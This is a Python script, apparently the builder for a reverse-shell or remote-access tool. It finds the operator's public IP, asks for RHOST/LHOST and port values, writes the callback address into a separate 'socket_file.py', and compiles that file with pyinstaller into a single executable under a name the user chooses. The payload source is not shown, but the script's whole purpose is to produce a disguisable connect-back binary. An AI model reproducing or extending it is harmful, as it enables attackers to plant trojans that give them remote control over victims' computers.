import re
import subprocess
from datetime import datetime
from urllib.request import urlopen

d = str(urlopen("http://checkip.dyndns.com/").read())
IPAddr = re.compile(r"Address: (\d+\.\d+\.\d+\.\d+)").search(d).group(1)

RHOST = input("RHOST ("+IPAddr+" / not recommended): ")
if RHOST == "":
    RHOST = IPAddr
RPORT = input("RPORT (8080): ")
if RPORT == "":
    RPORT = 8080

default_lhost = ""
if_config = subprocess.check_output(["ifconfig", "wlan0"]).decode()
ip_addr = re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", if_config)
if ip_addr:
    default_lhost = "("+ip_addr.group(0)+")"

LHOST = input("LHOST "+default_lhost+": ")
if LHOST == "" and ip_addr:
    LHOST = ip_addr.group(0)
elif LHOST == "":
    print("Error! You must use wifi adapter in your virtual machine")
    exit()
LPORT = input("LPORT (8080): ")
if LPORT == "":
    LPORT = 8080

file_name = input("file name: ")

f = open("logs/variable_logs.txt", "a")
f.write(datetime.now().strftime("\n# "+"%d/%m/%Y-%H:%M:%S") + " {'LHOST':'" + str(LHOST) + "','LPORT':" + str(LPORT) + ",'RHOST':'" + str(RHOST) + "','RPORT':" + str(RPORT) + "}")
f.close()

with open("socket_file.py", "r") as sc:
    lines = sc.readlines()
    count = 0
    for line in lines:
        if "my_socket" in line:
            break
        count += 1
    lines[count - 2] = """IPAddr = "{}"\n""".format(RHOST)
    lines[count - 1] = "Port = {}\n".format(RPORT)
with open("socket_file.py", "w") as sc:
    for line in lines:
        sc.write(line)

try:
    if file_name == "":
        subprocess.run(["pyinstaller", "socket_file.py", "--onefile"], stdout=subprocess.DEVNULL)
    else:
        subprocess.run(["pyinstaller", "socket_file.py", "-n", file_name, "--onefile"], stdout=subprocess.DEVNULL)
except Exception:
    user_choice = input("You must install 'pyinstaller' module. Do you want me to install it for you ? (Y/n)")
    if user_choice == "" or user_choice.lower() == "y":
        subprocess.run(["python", "-m", "pip", "install", "pyinstaller"])
        if file_name == "":
            subprocess.run(["pyinstaller", "socket_file.py", "--onefile"], stdout=subprocess.DEVNULL)
        else:
            subprocess.run(["pyinstaller", "socket_file.py", "-n", file_name, "--onefile"], stdout=subprocess.DEVNULL)
    else:
        exit()
